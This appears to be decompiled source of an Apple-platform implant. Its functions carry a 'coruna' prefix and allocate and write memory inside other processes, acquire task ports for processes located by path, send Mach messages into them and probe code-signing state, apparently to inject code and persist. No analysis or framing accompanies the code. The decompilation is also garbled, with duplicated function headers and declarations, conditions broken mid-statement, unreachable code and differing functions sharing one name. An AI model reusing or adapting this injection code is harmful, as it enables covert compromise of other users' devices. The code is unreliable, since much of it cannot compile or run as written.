                  type_id_8 = 0x12001;
done:
                  if (data[2] != 0) {
                    coruna_mach_vm_deallocate((int)arg[2],tmp_buf,type_id_11,1);
                  }
                  if (*str != 0) {
                    coruna_mach_vm_deallocate((int)arg[2],path_buf,0x38,1);
                  }
                  stack_guard = 0;
                  sa_saved = 0;
                  dataCnt = 0;
                }
                else {
                  type_id_8 = coruna_persist_via_dladdr(arg[1],str);
                  if (((int)type_id_8 != 0) ||
                     (type_id_8 = coruna_mach_vm_allocate((int)arg[2],0x38,1,&path_buf), (int)type_id_8 != 0))
                  goto done;
                  cache.__opaque[0x20] = '\0';
                  cache.__opaque[0x21] = '\0';
                  cache.__opaque[0x22] = '\0';
                  cache.__opaque[0x23] = '\0';
                  cache.__opaque[0x24] = '\0';
                  cache.__opaque[0x25] = '\0';
                  cache.__opaque[0x26] = '\0';
                  cache.__opaque[0x27] = '\0';
                  cache.__opaque[0x18] = '\0';
                  cache.__opaque[0x19] = '\0';
                  cache.__opaque[0x1a] = '\0';
                  cache.__opaque[0x1b] = '\0';
                  cache.__opaque[0x1c] = '\0';
                  cache.__opaque[0x1d] = '\0';
                  cache.__opaque[0x1e] = '\0';
                  cache.__opaque[0x1f] = '\0';
                  cache.__opaque[0x30] = '\0';
                  cache.__opaque[0x31] = '\0';
                  cache.__opaque[0x32] = '\0';
                  cache.__opaque[0x33] = '\0';
                  cache.__opaque[0x34] = '\0';
                  cache.__opaque[0x35] = '\0';
                  cache.__opaque[0x36] = '\0';
                  cache.__opaque[0x37] = '\0';
                  cache.__opaque[0x28] = '\0';
                  cache.__opaque[0x29] = '\0';
                  cache.__opaque[0x2a] = '\0';
                  cache.__opaque[0x2b] = '\0';
                  cache.__opaque[0x2c] = '\0';
                  cache.__opaque[0x2d] = '\0';
                  cache.__opaque[0x2e] = '\0';
                  cache.__opaque[0x2f] = '\0';
                  cache.__opaque[0] = '\0';
                  cache.__opaque[1] = '\0';
                  cache.__opaque[2] = '\0';
                  cache.__opaque[3] = '\0';
                  cache.__opaque[4] = '\0';
                  cache.__opaque[5] = '\0';
                  cache.__opaque[6] = '\0';
                  cache.__opaque[7] = '\0';
                  cache.__sig = 0;
                  cache.__opaque[0x10] = '\0';
                  cache.__opaque[0x11] = '\0';
                  cache.__opaque[0x12] = '\0';
                  cache.__opaque[0x13] = '\0';
                  cache.__opaque[0x14] = '\0';
                  cache.__opaque[0x15] = '\0';
                  cache.__opaque[0x16] = '\0';
                  cache.__opaque[0x17] = '\0';
                  cache.__opaque[8] = '\0';
                  cache.__opaque[9] = '\0';
                  cache.__opaque[10] = '\0';
                  cache.__opaque[0xb] = '\0';
                  cache.__opaque[0xc] = '\0';
                  cache.__opaque[0xd] = '\0';
                  cache.__opaque[0xe] = '\0';
                  cache.__opaque[0xf] = '\0';
                  _pthread_attr_init(&cache);
                  flags = _pthread_attr_setdetachstate(&cache,2);
                  if ((flags != 0) ||
                     (lk7 = _mach_vm_write(*(vm_map_t *)(arg + 2),path_buf,
                                             (vm_offset_t)&cache,0x38), lk7 != 0)) {
                    _pthread_attr_destroy(&cache);
                    type_id_8 = 0xad00b;
                    goto done;
                  }
                  data[0xe] = path_buf;
                  *(uint32_t *)(data + 0xf) = 0x38;
                  _pthread_attr_destroy(&cache);
                  type_id_8 = coruna_mach_vm_allocate((int)arg[2],type_id_11,0x3000001,&tmp_buf);
                  if ((int)type_id_8 != 0) goto done;
                  data[2] = tmp_buf;
                  lk7 = _mach_vm_write(*(vm_map_t *)(arg + 2),tmp_buf,(vm_offset_t)data,
                                         dataCnt);
                  if (lk7 != 0) {
                    type_id_8 = 0x1e01a;
                    goto done;
                  }
                  type_id_8 = 0;
                  sa_saved = tmp_buf;
                  stack_guard = work;
                }
                _bzero(data,type_id_11);
                _free(data);
                port = region;
              }
              _bzero(plist,(unsigned long)port);
              _free(plist);
            }
            else {
              stack_guard = 0;
              sa_saved = 0;
              dataCnt = 0;
            }
            _bzero(json_buf,(unsigned long)url_buf);
            _free(json_buf);
            if ((int)type_id_8 == 0) {
              type_id_8 = coruna_remote_memcpy(arg[1],stack_guard,sa_saved,dataCnt,(int)arg[4]);
              if ((int)type_id_8 == 0) {
                if (arg[1] != 0) {
                  *(uint8_t *)(arg[1] + 0xfb) = 0;
                }
                *(uint32_t *)(arg + 4) = 0;
                type_id_8 = coruna_mach_port_deallocate(arg,&k_persist_slot_4e20,3,0);
                if ((int)type_id_8 == 0) {
                  cache.__sig = cache.__sig & 0xffffffff00000000;
                  type_id_8 = coruna_mach_port_deallocate(arg,30000,8,&cache);
                  if ((int)type_id_8 == 0) {
                    type_id_9 = (unsigned long)(n + 0x43U & 0xfffffffc);
                    buf = _calloc(1,type_id_9);
                    if (buf == (void *)0x0) {
                      type_id_8 = 0xad009;
                    }
                    else {
                      *(uint64_t *)((long)buf + 0x14) = 0x100000001;
                      flags = *(int *)((long)arg + 0x14);
                      if (1 < flags + 1U) {
                        *(uint32_t *)((long)buf + 0x24) = 0x130000;
                        *(int *)((long)buf + 0x1c) = flags;
                      }
                      *(int *)((long)buf + 0x38) = (int)arg[3];
                      *(int *)((long)buf + 0x3c) = n;
                      *(unsigned long *)((long)buf + 0x30) = m;
                      coruna_persist_trampoline_00010010((long)buf + 0x40,val,n);
                      type_id_8 = coruna_mach_msg_send(cache.__sig & 0xffffffff,buf,type_id_9,30000,1);
                      _bzero(buf,type_id_9);
                      _free(buf);
                    }
                    ptr = k_persist_mach_task_self_slot;
                    _mach_port_deallocate
                              (*(ipc_space_t *)k_persist_mach_task_self_slot,
                               (mach_port_name_t)cache.__sig);
                    if (((int)type_id_8 == 0) && ((r == 0 || (type_id_8 = 0xad001, q != 0)))) {
                      ls11 = _strlen(p);
                      if (ls11 - 1 < 0x3fe) {
                        cache.__sig = cache.__sig & 0xffffffff00000000;
                        type_id_8 = coruna_mach_port_deallocate(arg,30000,9,&cache);
                        if ((int)type_id_8 == 0) {
                          type_id_9 = (unsigned long)(r + (int)ls11 + 0x24U & 0xfffffffc);
                          buf = _calloc(1,type_id_9);
                          if (buf == (void *)0x0) {
                            type_id_8 = 0xad009;
                          }
                          else {
                            *(uint32_t *)((long)buf + 0x14) = 2;
                            *(int *)((long)buf + 0x18) = (int)(ls11 + 1);
                            *(int *)((long)buf + 0x1c) = r;
                            coruna_persist_trampoline_00010010((long)buf + 0x20,p,ls11 + 1);
                            if (r != 0) {
                              coruna_persist_trampoline_00010010((long)buf + ls11 + 0x21,q,r);
                            }
                            type_id_8 = coruna_mach_msg_send(cache.__sig & 0xffffffff,buf,type_id_9,30000,0)
                            ;
                            _bzero(buf,type_id_9);
                            _free(buf);
                          }
                          _mach_port_deallocate
                                    (*(ipc_space_t *)ptr,(mach_port_name_t)cache.__sig);
                          if (((int)type_id_8 == 0) &&
                             (type_id_8 = coruna_mach_port_deallocate(arg,&k_persist_slot_4e20,10,0), (int)type_id_8 == 0)) {
                            if (s == (uint32_t *)0x0) {
                              _mach_port_mod_refs(*(ipc_space_t *)ptr,
                                                  *(mach_port_name_t *)((long)arg + 0x1c),1,-1);
                            }
                            else {
                              *s = *(uint32_t *)((long)arg + 0x1c);
                            }
                            type_id_8 = 0;
                            *(uint32_t *)((long)arg + 0x1c) = 0;
                          }
                        }
                      }
                      else {
                        type_id_8 = 0x1e010;
                      }
                    }
                  }
                }
              }
              else {
                coruna_mach_vm_deallocate((int)arg[2],sa_saved,dataCnt,1);
              }
            }
          }
        }
      }
    }
    else {
      u = 0x12001;
      if (port != 0) {
        u = port;
      }
      type_id_8 = (unsigned long)u;
    }
  }
  if (status == 0) {
    coruna_set_priority((int)arg[2],sa_new,0);
  }
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return type_id_8;
  }
  ___stack_chk_fail();
}





uint coruna_set_priority(mach_port_name_t arg,int flags,int *count_2)
{
  uint u;
  int err;
  int status;
  int *err;
  uint *ptr;
  id_t scratch;
  
  scratch = 0xffffffff;
  u = 0xad001;
  if (((1 < arg + 1) && (-0x15 < flags)) && (flags < 0x15)) {
    u = _pid_for_task(arg,(int *)&scratch);
    if (u == 0) {
      err = ___error();
      *err = 0;
      err = _getpriority(0,scratch);
      err = ___error();
      if (((*err == 0) || (err != -1)) &&
         (status = _setpriority(0,scratch,flags), status == 0)) {
        u = 0;
        if (count_2 != (int *)0x0) {
          *count_2 = err;
        }
      }
      else {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        u = -*ptr;
        if (-1 < err) {
          u = *ptr;
        }
        u = u | 0x40000000;
      }
    }
    else {
      u = u | 0x80000000;
    }
  }
  return u;
}





unsigned long coruna_mach_port_deallocate(long arg,uint64_t val,int n,mach_port_name_t *m)

{
  uint u;
  mach_port_name_t *lpm2;
  unsigned long version;
  mach_port_name_t cache_21;
  uint64_t cache_22;
  
  if (arg == 0) {
    version = 0xad001;
  }
  else {
    cache_22 = 0;
    cache_21 = 0;
    lpm2 = (mach_port_name_t *)0x0;
    if (m != (mach_port_name_t *)0x0) {
      lpm2 = &cache_21;
    }
    version = coruna_mach_port_deallocate(*(uint32_t *)(arg + 0x1c),val,(long)&cache_22 + 4,&cache_22,
                         lpm2);
    if ((int)version == 0) {
      version = cache_22 & 0xffffffff;
      if ((int)cache_22 == 0) {
        u = 0x1e040;
        if (cache_22 == n) {
          u = 0;
        }
        version = (unsigned long)u;
        if ((cache_22 == n) && (m != (mach_port_name_t *)0x0)) {
          version = 0x1e036;
          if (1 < cache_21 + 1) {
            version = 0;
            *m = cache_21;
            cache_21 = 0;
          }
        }
      }
      if (1 < cache_21 + 1) {
        _mach_port_deallocate(*(ipc_space_t *)k_persist_mach_task_self_slot,cache_21);
      }
    }
  }
  return version;
}





uint64_t
uint64_t coruna_mach_port_deallocate(uint64_t val,uint64_t id_2,uint32_t *size,uint32_t *flags_2, uint32_t *version_3)
{
  void *ptr;
  uint64_t u;
  
  if ((int)val + 1U < 2) {
    u = 0x1e01b;
  }
  else {
    ptr = _calloc(1,0x28);
    if (ptr == (void *)0x0) {
      u = 0xad009;
    }
    else {
      u = coruna_mach_msg_recv(val,5,0x28,ptr,id_2);
      if ((int)u == 0) {
        if (*(int *)((long)ptr + 0x14) == 5) {
          u = 0x1e038;
          if (*(int *)((long)ptr + 4) == 0x20) {
            if (size != (uint32_t *)0x0) {
              *size = *(uint32_t *)((long)ptr + 0x18);
            }
            if (flags_2 != (uint32_t *)0x0) {
              *flags_2 = *(uint32_t *)((long)ptr + 0x1c);
            }
            u = 0;
            if (version_3 != (uint32_t *)0x0) {
              *version_3 = *(uint32_t *)((long)ptr + 8);
              *(uint32_t *)((long)ptr + 8) = 0;
            }
          }
        }
        else {
          u = 0x1e038;
        }
      }
      if (1 < *(mach_port_name_t *)((long)ptr + 8) + 1) {
        _mach_port_deallocate
                  (*(ipc_space_t *)k_persist_mach_task_self_slot,
                   *(mach_port_name_t *)((long)ptr + 8));
      }
      _free(ptr);
    }
  }
  return u;
}





uint64_t coruna_mach_port_destroy(mach_port_name_t *arg,uint64_t val,long handle)
{
  uint64_t u;
  mach_port_name_t scratch;
  
  u = 0xad001;
  if ((arg != (mach_port_name_t *)0x0) && (handle != 0)) {
    if ((int)val + 1U < 2) {
      u = 0x1e009;
    }
    else {
      scratch = 0;
      u = coruna_mach_port_allocate(&scratch,5);
      if ((int)u == 0) {
        u = coruna_mach_port_insert_right(scratch,val,handle);
        if ((int)u == 0) {
          *arg = scratch;
        }
        else if (1 < scratch + 1) {
          _mach_port_destroy(*(ipc_space_t *)k_persist_mach_task_self_slot,scratch);
        }
      }
    }
  }
  return u;
}
unsigned long coruna_realpath(uint64_t arg,uint64_t val,uint32_t *n)

{
  uint u;
  uint64_t size;
  bool err;
  int status;
  char *ptr;
  char *buf;
  size_t ls7;
  void *copy;
  unsigned long type_id_12;
  char *str;
  unsigned long type_id_13;
  void *data;
  unsigned long type_id_10;
  uint8_t kind[16];
  uint8_t *cache_23;
  uint64_t cache_24;
  void (*cache_25)(void);
  uint8_t *cache_26;
  uint64_t *cache_27;
  uint64_t *cache_28;
  uint64_t *cache_29;
  char *cache_30;
  byte cache_31;
  byte cache_32;
  byte cache_33;
  uint64_t cache_34;
  uint64_t *cache_35;
  uint64_t cache_36;
  uint32_t cache_37;
  uint64_t cache_38;
  uint64_t *cache_39;
  uint64_t cache_40;
  uint32_t cache_41;
  uint64_t cache_42;
  uint64_t *cache_43;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t scratch;
  uint8_t *cache_46;
  uint64_t cache_47;
  void (*cache_48)(void);
  uint8_t *cache_49;
  uint8_t **cache_50;
  uint8_t *cache_51;
  size_t cache_52;
  uint8_t cache_53[4096];
  uint64_t cache_54;
  uint64_t bootargs;
  long serial_buf;
  
  kind = (*(void (*)k_persist_chkstk_darwin_slot)();
  ptr = kind;
  serial_buf = *(long *)k_persist_stack_chk_guard_slot;
  if ((ptr == (char *)0x0) || (*ptr == '\0' || n == (uint32_t *)0x0)) {
    u = 0xad001;
    if (n != (uint32_t *)0x0) {
      u = 0x1e03f;
    }
    type_id_13 = (unsigned long)u;
    if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
    return type_id_13;
    }
    ___stack_chk_fail();
  }
  if ((kind & 1) == 0) {
    buf = _strrchr(ptr,0x2f);
    if (buf != (char *)0x0) {
      ptr = buf + 1;
    }
    if (*ptr == '\0') {
check_ok:
      type_id_13 = 0x1e03f;
      if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
      return type_id_13;
      }
      ___stack_chk_fail();
    }
    str = (char *)0x0;
    buf = ptr;
  }
  else {
    str = (char *)_realpath_DARWIN_EXTSN(ptr,0);
    buf = str;
    if (str == (char *)0x0) {
      if (*ptr == '\0') {
        type_id_13 = 0x1e03f;
        if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
        return type_id_13;
        }
        ___stack_chk_fail();
      }
      str = (char *)0x0;
      buf = ptr;
    }
  }
  size = k_persist_rodata_word_1ef80;
  cache_31 = ~kind[8] & 1;
  cache_28 = &cache_42;
  cache_42 = 0;
  u = kind & 0xff;
  cache_44 = k_persist_rodata_word_1ef70;
  cache_33 = ((byte)(u >> 2) ^ 0xff) & 1;
  cache_32 = ((byte)(u >> 1) ^ 0xff) & 1;
  cache_45 = 0;
  scratch = 0;
  cache_29 = &cache_38;
  cache_38 = 0;
  cache_40 = k_persist_rodata_word_1ef78;
  cache_41 = 0;
  cache_27 = &cache_34;
  cache_34 = 0;
  cache_36 = k_persist_rodata_word_1ef78;
  cache_37 = 0;
  cache_23 = k_persist_nsconcretestackblock_slot;
  cache_24 = k_persist_rodata_word_1ef80;
  cache_25 = coruna_strrchr;
  cache_26 = &k_persist_rodata_word_20768;
  cache_30 = buf;
  cache_35 = cache_27;
  cache_39 = cache_29;
  cache_43 = cache_28;
  _bzero(cache_53,0x1000);
  cache_46 = k_persist_nsconcretestackblock_slot;
  cache_47 = size;
  cache_48 = coruna_proc_pidpath;
  cache_49 = &k_persist_rodata_word_20798;
  bootargs = k_persist_rodata_word_0001ef98;
  cache_54 = k_persist_rodata_word_1ef90;
  cache_52 = 0;
  cache_50 = &cache_23;
  cache_51 = cache_53;
  status = _sysctl((int *)&cache_54,4,(void *)0x0,&cache_52,(void *)0x0,0);
  if ((status == 0) && (cache_52 != 0)) {
    cache_52 = cache_52 << 1;
    copy = _malloc(cache_52);
    if (copy == (void *)0x0) goto skip;
    status = _sysctl((int *)&cache_54,4,copy,&cache_52,(void *)0x0,0);
    if ((status == 0) && (cache_52 != 0)) {
      type_id_12 = cache_52 / 0x288;
      if ((int)type_id_12 == 0) {
        type_id_13 = 0;
      }
      else {
        type_id_10 = 1;
        data = copy;
        do {
          type_id_13 = (*cache_48)(&cache_46,data);
          err = type_id_10 < (type_id_12 & 0xffffffff);
          type_id_10 = type_id_10 + 1;
          data = (void *)((long)data + 0x288);
        } while ((int)type_id_13 == 0 && err);
      }
    }
    else {
      type_id_13 = 0xad00b;
    }
    _bzero(copy,cache_52);
    _free(copy);
    if ((int)type_id_13 == 0) {
      if (*(int *)(cache_35 + 3) == 0) {
        type_id_13 = 0xad011;
      }
      else {
        type_id_13 = 0;
        *n = *(uint32_t *)(cache_39 + 3);
      }
    }
  }
  else {
skip:
    type_id_13 = 0xad00b;
  }
  __Block_object_dispose(&cache_34,8);
  __Block_object_dispose(&cache_38,8);
  __Block_object_dispose(&cache_42,8);
  if (str != (char *)0x0) {
    ls7 = _strlen(str);
    if (ls7 != 0) {
      _bzero(str,ls7);
    }
    _free(str);
  }
cleanup:
  if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
    return type_id_13;
  }
  ___stack_chk_fail();
}





uint64_t coruna_strrchr(long handle,long *addr_2,char *path)
{
  int err;
  char *ptr;
  long handle;
  long addr;
  long off;
  
  if (*(char *)(handle + 0x40) != '\0') {
    if (path == (char *)0x0) {
      return 0;
    }
    ptr = _strrchr(path,0x2f);
    if (ptr != (char *)0x0) {
      path = ptr + 1;
    }
  }
  if (path == (char *)0x0) {
    return 0;
  }
  if (addr_2 == (long *)0x0) {
    return 0;
  }
  err = _strcmp(*(char **)(handle + 0x38),path);
  if ((err == 0) && (0 < (int)addr_2[5])) {
    handle = *(long *)(*(long *)(handle + 0x20) + 8);
    *(int *)(handle + 0x18) = *(int *)(handle + 0x18) + 1;
    if ((1 < *(uint *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18)) &&
       (*(char *)(handle + 0x41) == '\0')) {
      return 0x1e03e;
    }
    if (*(char *)(handle + 0x42) == '\0') {
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      off = *(long *)(handle + 0x18);
      if ((off == 0) && (*(int *)(handle + 0x20) == 0)) {
        addr = *addr_2;
      }
      else {
        addr = *addr_2;
        if (off <= addr) {
          if (addr != off) {
            return 0;
          }
          addr = off;
          if (*(int *)(handle + 0x20) <= (int)addr_2[1]) {
            return 0;
          }
        }
      }
    }
    else {
      addr = *addr_2;
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      if (addr <= *(long *)(handle + 0x18)) {
        if (addr != *(long *)(handle + 0x18)) {
          return 0;
        }
        if ((int)addr_2[1] <= *(int *)(handle + 0x20)) {
          return 0;
        }
      }
    }
    *(long *)(handle + 0x18) = addr;
    *(int *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x20) = (int)addr_2[1];
    *(int *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = (int)addr_2[5];
    return 0;
  }
  return 0;
}





void coruna_block_assign_18f78(long handle,long addr_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_assign((void *)(handle + 0x30),*(void **)(addr_2 + 0x30),8);
  return;
}





void coruna_block_dispose_18fd8(long handle)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_dispose(*(void **)(handle + 0x30),8);
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t coruna_proc_pidpath(long handle,long addr_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  uint64_t *ptr;
  unsigned long unaff_x30;
  uint64_t size;
  
  if (0 < *(int *)(addr_2 + 0x28)) {
    err = _proc_pidpath(*(int *)(addr_2 + 0x28),*(void **)(handle + 0x28),0x1000);
    if (0 < err) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))
                        (*(long *)(handle + 0x20),addr_2,*(uint64_t *)(handle + 0x28));
      return u;
    }
    ptr = *(uint64_t **)(handle + 0x28);
    size = *(uint64_t *)(addr_2 + 0xfb);
    u = *(uint64_t *)(addr_2 + 0xf3);
    *(uint8_t *)(ptr + 2) = *(uint8_t *)(addr_2 + 0x103);
    ptr[1] = size;
    *ptr = u;
    *(uint8_t *)(*(long *)(handle + 0x28) + 0x11) = 0;
  }
  return 0;
}





void coruna_block_assign_copy(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),7);
  return;
}





void coruna_block_dispose_copy(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),7);
  return;
}





int coruna_ctx_free(uint64_t *val)
{
  int err;
  int status;
  void *ptr;
  
  if (val == (uint64_t *)0x0) {
    err = 0xad001;
  }
  else {
    ptr = (void *)val[6];
    if (ptr != (void *)0x0) {
      coruna_objc_msgsend(ptr);
      _free(ptr);
    }
    err = coruna_rwlock_iface_destroy(val[5]);
    status = coruna_mach_port_deallocate(val[3]);
    if (err != 0) {
      status = err;
    }
    err = status;
    if ((*(char *)(val + 1) != '\0') && (err = coruna_ctx_free(*val), status != 0)) {
      err = status;
    }
    val[6] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
  }
  return err;
}





unsigned long coruna_csops(uint64_t *arg,short *val,long n,short *m)

{
  uint u;
  pid_t lp2;
  int count;
  unsigned long type_id;
  int *err;
  uint *buf;
  long *obj;
  uint64_t *str;
  int idx;
  unsigned long host_info;
  uint32_t serial_buf;
  uint8_t cache_55[4];
  int *cache_20;
  uint64_t thread_attr;
  uint32_t scratch;
  long thread_attr;
  
  thread_attr = *(long *)k_persist_stack_chk_guard_slot;
  serial_buf = 0;
  host_info = 0;
  type_id = coruna_parse_xnu_version(&host_info);
  if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
  return type_id;
  }
  ___stack_chk_fail();
  _getpid();
  cache_20 = (int *)0x0;
  thread_attr = 0;
  scratch = 0;
  if (k_persist_rodata_word_1efa0 <= *(double *)k_persist_dyldversionnumber_slot) {
    lp2 = _getpid();
    count = _csops(lp2,0,cache_55,4);
    if (-1 < count) goto retry;
  }
  else {
    lp2 = _getpid();
    count = _csops(lp2,5,&cache_20,0x14);
    if ((-1 < count) || (err = ___error(), *err == 0x55)) {
retry:
      type_id = 0xad001;
      if ((arg == (uint64_t *)0x0) ||
         if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
         return type_id;
         }
         ___stack_chk_fail();
      cache_20 = (int *)0x0;
      host_info = host_info & 0xffffffff00000000;
      count = (**(void (**)(val + 0xc))(val,0xf0000,&cache_20,&host_info);
      if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
      return type_id;
      }
      ___stack_chk_fail();
      count = *cache_20;
      if (count < -0x30051202) {
        if ((count != -0x41450136) && (count != -0x35014542)) {
          idx = -0x31051202;
found:
          if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
          return type_id;
          }
          ___stack_chk_fail();
        }
      }
      else if (1 < count + 0x1120532U) {
        idx = -0x30051202;
        goto found;
      }
      if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
      return type_id;
      }
      ___stack_chk_fail();
      if (((m == (short *)0x0) || (*m != 2)) || ((ushort)m[1] < 2)) {
        cache_20 = (int *)((unsigned long)cache_20 & 0xffffffffffffff00);
        count = coruna_csops(&cache_20);
        if ((count != 0) || ((char)cache_20 != '\0')) {
          type_id = 0x1e037;
          if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
          return type_id;
          }
          ___stack_chk_fail();
        }
        obj = _calloc(1,0x38);
        if (obj != (long *)0x0) {
          if (m != (short *)0x0) goto nomem;
          goto invalid;
        }
      }
      else {
        obj = _calloc(1,0x38);
        if (obj != (long *)0x0) {
nomem:
          str = _calloc(1,0x10);
          if (str == (uint64_t *)0x0) {
            type_id = 0xad009;
          }
          else {
            *str = m;
            cache_20 = (int *)0x0;
            type_id = coruna_mach_port_create(&cache_20,m);
            if ((int)type_id == 0) {
              host_info = 0;
              count = coruna_calloc(&host_info);
              if (count != 0) {
                obj[6] = host_info;
              }
              type_id = 0;
              *obj = n;
              obj[2] = (long)val;
              obj[3] = (long)cache_20;
              obj[4] = (long)m;
              obj[5] = (long)str;
              *arg = obj;
              if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
              return type_id;
              }
              ___stack_chk_fail();
            }
            coruna_rwlock_iface_destroy(str);
          }
invalid:
          _free(obj);
          if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
          return type_id;
          }
          ___stack_chk_fail();
        }
      }
      type_id = 0xad009;
      if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
      return type_id;
      }
      ___stack_chk_fail();
    }
  }
  err = ___error();
  count = *err;
  buf = (uint *)___error();
  u = -*buf;
  if (-1 < count) {
    u = *buf;
  }
  type_id = (unsigned long)(u | 0x40000000);
next:
  if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
    return type_id;
  }
  ___stack_chk_fail();
}
int * coruna_mach_port_deallocate_2145c(int *flags,char *path,uint64_t val,long handle,uint64_t id_2,
                  char *str_2,long addr_2,uint64_t size_3,uint64_t off_4,
                  uint64_t off_5,mach_port_name_t *arg,uint32_t *size)
{
  uint u;
  int *err;
  long *ptr;
  int *status;
  mach_port_name_t scratch;
  unsigned long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_persist_stack_chk_guard_slot;
  status = (int *)0xad001;
  err = flags;
  if (flags != (int *)0x0) {
    if (path == (char *)0x0) {
      status = (int *)0x1e03f;
    }
    else {
      status = (int *)0x1e03f;
      if ((((*path != '\0') && (status = (int *)0x1e01c, handle != 0)) && ((int)id_2 != 0))
         && ((status = (int *)0x1e01d, str_2 != (char *)0x0 && (*str_2 != '\0')))) {
        if (((int)size_3 == 0) || (addr_2 != 0)) {
          ptr = *(long **)(flags + 10);
          status = (int *)0xad001;
          if (ptr != (long *)0x0) {
            scratch = k_persist_rodata_word_0001efd8;
            bootargs = k_persist_rodata_word_1efd0;
            thread_attr = k_persist_rodata_word_0001efe8;
            bootargs = k_persist_rodata_word_1efe0;
            status = (int *)(**(void (**)(*ptr + 0x40))(*ptr,ptr + 1,&bootargs,2,0);
            err = status;
            if ((int)status == 0) {
              bootargs = bootargs & 0xffffffff00000000;
              status = (int *)coruna_realpath(path,val,&bootargs);
              err = status;
              if ((int)status == 0) {
                scratch = 0;
                status = (int *)coruna_task_for_pid(*(uint64_t *)(flags + 10),bootargs & 0xffffffff,
                                             &scratch);
                if ((uint)status == 0) {
                  status = (int *)coruna_pid_for_task(flags,scratch,handle,id_2,str_2,addr_2,
                                               size_3,off_4,off_5);
                  if ((int)status == 0) {
                    if (arg != (mach_port_name_t *)0x0) {
                      *arg = scratch;
                      scratch = 0;
                    }
                    if (size != (uint32_t *)0x0) {
                      *size = (uint32_t)bootargs;
                    }
                  }
                  err = status;
                  if (1 < scratch + 1) {
                    u = *(uint *)k_persist_mach_task_self_slot;
                    err = (int *)(unsigned long)u;
                    if (u != scratch) {
                      u = _mach_port_deallocate(u,scratch);
                      err = (int *)(unsigned long)u;
                    }
                  }
                }
                else {
                  err = (int *)_csops_audittoken(bootargs & 0xffffffff,0,0,0,1);
                  if ((int)err != 0) {
                    err = ___error();
                    u = 0x1e03f;
                    if (*err != 3) {
                      u = (uint)status;
                    }
                    status = (int *)(unsigned long)u;
                  }
                }
              }
              ptr = *(long **)(flags + 10);
              if ((ptr != (long *)0x0) && (ptr[1] != 0)) {
                err = (int *)(**(void (**)(*ptr + 0x30))();
              }
            }
          }
        }
        else {
          status = (int *)0x1e01e;
        }
      }
    }
  }
  if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
    return status;
  }
  ___stack_chk_fail(err);
}





uint64_t
uint64_t coruna_pid_for_task(uint64_t *val,uint64_t id_2,int64_t arg,uint64_t size_3,char *path, int64_t arg,uint64_t off_4,uint64_t off_5,uint64_t off_6)
{
  kern_return_t lk1;
  int err;
  pid_t lp3;
  int status;
  uint64_t u;
  mach_port_name_t t;
  uint32_t scratch;
  int bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  
  bootargs = -1;
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  t = (mach_port_name_t)id_2;
  if (t + 1 < 2) {
    return 0x1e009;
  }
  if (arg == 0) {
    return 0x1e01c;
  }
  if ((int)size_3 == 0) {
    return 0x1e01c;
  }
  if (path == (char *)0x0) {
    return 0x1e01d;
  }
  if (*path == '\0') {
    return 0x1e01d;
  }
  if (((int)off_4 != 0) && (arg == 0)) {
    return 0x1e01e;
  }
  lk1 = _pid_for_task(t,&bootargs);
  status = bootargs;
  if (lk1 == 0) {
    serial_buf = 0;
    host_info = 0;
    err = coruna_parse_xnu_version(&host_info);
    if ((err == 0) && (0 < status)) {
      lp3 = _getpid();
      if (lp3 != status) {
        thread_attr = 0;
        status = _proc_pidinfo(status,0x13,0,&thread_attr,8);
        if (status != 8) {
          return 0x1e03f;
        }
        if ((int)thread_attr != 0x100000c) {
          return 0x1e03f;
        }
        if (2 < (thread_attr & 0xffffff)) {
          return 0x1e03f;
        }
      }
      u = coruna_persist_via_macho_open_image_3(*val,id_2,arg,size_3);
      if ((int)u != 0) {
        return u;
      }
      host_info = coruna_u64_pack((host_info), (0xffffffff));
      lk1 = _pid_for_task(t,(int *)&host_info);
      if ((((lk1 == 0) && (0 < (int)host_info)) && (val[6] != 0)) &&
         (status = coruna_objc_msgsend_iface(), status == 2)) {
        return 0x1e041;
      }
      thread_attr = thread_attr & 0xffffffff00000000;
